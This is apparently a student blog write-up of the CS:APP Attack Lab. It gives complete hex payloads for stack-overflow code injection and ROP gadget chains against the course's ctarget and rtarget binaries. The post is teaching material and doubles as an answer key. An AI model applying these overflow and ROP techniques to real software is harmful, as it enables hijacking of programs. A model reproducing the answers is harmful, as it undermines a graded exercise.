---
title: csapppp_attacklab
date: 2021-04-17 11:09:22
tags:
---

my third week challenge 

attack lab

<!--more-->

`cookie.txt` 一个8为16进行数，作为攻击的特殊标志符

`farm.c` 在ROP攻击中作为gadgets的产生源

`ctarget` 代码注入攻击的目标文件

`rtarget` ROP攻击的目标文件

`hex2row` 将16进制数转化为攻击字符，因为有些字符在屏幕上面无法输入，所以输入该字符的16进制数，自动转化为该字符

执行

./hex2raw -i 文件名 | ./ctarget -q

可以验证答案是否正确

## touch1

```
void __cdecl test()
{
  unsigned int v0; // eax

  v0 = getbuf();
  __printf_chk(1LL, "No exploit.  Getbuf returned 0x%x\n", v0);
}
```

调用test之后调用getbuf

```
unsigned int __cdecl getbuf()
{
  char buf[32]; // [rsp+0h] [rbp-28h] BYREF

  Gets(buf);
  return 1;
}
```

可以看见用的是gets函数可以无限读取造成溢出

buf距离返回地址0x28

touch1要求就是溢出跳转到touch1这里

因为文件的特殊性不能直接运行无法用pwntools模块搞定要配合给的hex2row文件

虽然buf距离返回地址0x28但是buf只有32大小所以我们传入40个字 在传入我们的地址0x4017c0

构造如下

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```



## touch2

```
void __fastcall __noreturn touch2(unsigned int val)
{
  vlevel = 2;
  if ( val == cookie )
  {
    __printf_chk(1LL, "Touch2!: You called touch2(0x%.8x)\n", val);
    validate(2);
  }
  else
  {
    __printf_chk(1LL, "Misfire: You called touch2(0x%.8x)\n", val);
    fail(2);
  }
  exit(0);
}
```

比较cookie值 cookie是0x59b997fa

利用溢出跳转到函数touch2并且传入cookie值

我们需要用到汇编语言编写命令

```
movq    $0x59b997fa, %rdi
pushq   0x4017ec
ret
```

rdi里面存放我们cookie的值

0x4017ec在ida是完成压栈命令

```
00000000004017EC                 sub     rsp, 8
```

我们将命令转为二进制文件

```
q@ubuntu:~$ gcc -c 2.s
q@ubuntu:~$ objdump -d 2.o

2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	ff 34 25 ec 17 40 00 	pushq  0x4017ec
   e:	c3                   	retq   

```

我们还需要知道栈指针的初始指向地址 从这个地方开始传入数据，所以要查看rsp

用gdb断点打在getbuf

用命令p/x $rsp

```
pwndbg> p /x $rsp
$1 = 0x5561dc78
```

我们需要传入的字符如下

```
48 c7 c7 fa 97 b9 59 68 ec 17 
40 00 c3 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 00 00 
78 dc 61 55 00 00 00 00 
```

 

## touch3

```
void __fastcall __noreturn touch3(char *sval)
{
  vlevel = 3;
  if ( hexmatch(cookie, sval) )
  {
    __printf_chk(1LL, "Touch3!: You called touch3(\"%s\")\n", sval);
    validate(3);
  }
  else
  {
    __printf_chk(1LL, "Misfire: You called touch3(\"%s\")\n", sval);
    fail(3);
  }
  exit(0);
}
```

调用hexmatch如下 去对比传入值和cookie是不是一样的

不过要注意strncmp()是字符串的比对我们还要用

man ascil查看cookie对应的16进制ASCII码

```
int __fastcall hexmatch(unsigned int val, char *sval)
{
  const char *v2; // rbx
  char cbuf[110]; // [rsp+0h] [rbp-98h] BYREF
  unsigned __int64 v5; // [rsp+78h] [rbp-20h]

  v5 = __readfsqword(0x28u);
  v2 = &cbuf[random() % 100];
  __sprintf_chk(v2, 1LL, -1LL, "%.8x", val);
  return strncmp(sval, v2, 9uLL) == 0;
}
```

我们从touch2可以知道起始栈地址是0x5561dc78

0x28+8=48

0x5561dc78+48=0x5561dca8这个就是我们字符串进行的地址啦

汇编编写

```
movq    $0x5561dca8, %rdi
pushq   0x4018fa
ret
```

```
q@ubuntu:~$ objdump -d 3.o

3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   7:	ff 34 25 fa 18 40 00 	pushq  0x4018fa
   e:	c3                   	retq   

```

综上所述得到注入字符

```
48 c7 c7 a8 dc 61 55 68 fa 18 
40 00 c3 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 35 39
62 39 39 37 66 61 00
```

## rop攻击

### touch 2

这次我们不直接从栈上去攻击

而是利用程序现有的汇编片段去构建完整的汇编指令

输入objdump -d rtarget 可以看见ctarget汇编片段

本题需要构造的汇编代码

```
popq %rax
movq %rax, %rdi
```

汇编码如下

![](https://upload-images.jianshu.io/upload_images/1433829-d6312f1ce53cf044.png?imageMogr2/auto-orient/strip|imageView2/2/w/754/format/webp)

![](https://upload-images.jianshu.io/upload_images/1433829-2a663eb32fae331a.png?imageMogr2/auto-orient/strip|imageView2/2/w/574/format/webp)

![](https://upload-images.jianshu.io/upload_images/1433829-c713c395456655fa.png?imageMogr2/auto-orient/strip|imageView2/2/w/621/format/webp)

![](https://upload-images.jianshu.io/upload_images/1433829-67690582e19e902b.png?imageMogr2/auto-orient/strip|imageView2/2/w/586/format/webp))

popq %rax 58

movq %rax, %rdi 48 89 c7

如下rax要的包含在这 我们可以得到0x4019ab就是popq %rax

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

```

如下是mov的

```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   
```

movq %rax, %rdi就是0x4019a2

so 我们得到的注入字符

填充40个字，然后popq %rax

传入cookie，接着让rdi指向rax指向的地址

最后call touch2

```
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00
fa 97 b9 59 00 00 00 00
a2 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```



### touch3

虽然是rop攻击但是整体思路不算变化太大，但是这里找地址传参的话要注意栈地址是随机的 我们还要多加一步找字符串的偏移量

1.获取rsp指向地址传给rdi

2.找偏移地址送到rsi

3.lea (%rdi,%rsi,1),%rax,将字符串的首地址传送到%rax, 再传送到%rdi

4.call touch3



获取rsp然后给到rax再把rax传到rdi完成第一步

```
0000000000401a03 <addval_190>:
  401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
  401a09: c3  
```

```
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
```

movq %rsp, %rax 0x401a06

movq %rax, %rdi  0x4019a2

接着把偏移pop到rax

```
00000000004019ca <getval_280>:
  4019ca: b8 29 58 90 c3        mov    $0xc3905829,%eax
  4019cf: c3   
```

popq %rax 0x4019cc

接着将eax传到edx

```bash
00000000004019db <getval_481>:
  4019db: b8 5c 89 c2 90        mov    $0x90c2895c,%eax
  4019e0: c3  
```

movl %eax, %edx  0x4019dd



把edx给ecx

```bash
0000000000401a6e <setval_167>:
  401a6e: c7 07 89 d1 91 c3     movl   $0xc391d189,(%rdi)
  401a74: c3  
```

movl %edx, %ecx  0x401a70

把ecx给esi

```xml
0000000000401a11 <addval_436>:
  401a11: 8d 87 89 ce 90 90     lea    -0x6f6f3177(%rdi),%eax
  401a17: c3                    retq 
```



movl %ecx, %esi   0x401a13

将栈顶+偏移量得到字符串首地址给到rax

```xml
00000000004019d6 <add_xy>:
  4019d6: 48 8d 04 37           lea    (%rdi,%rsi,1),%rax
  4019da: c3                    retq 
```

0x4019d6



然后把rax传到rdi

```xml
00000000004019a0 <addval_273>:
  4019a0: 8d 87 48 89 c7 c3     lea    -0x3c3876b8(%rdi),%eax
  4019a6: c3
```

movq %rax, %rdi  0x4019a2

综上所述得到字符串

```undefined
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61 00
```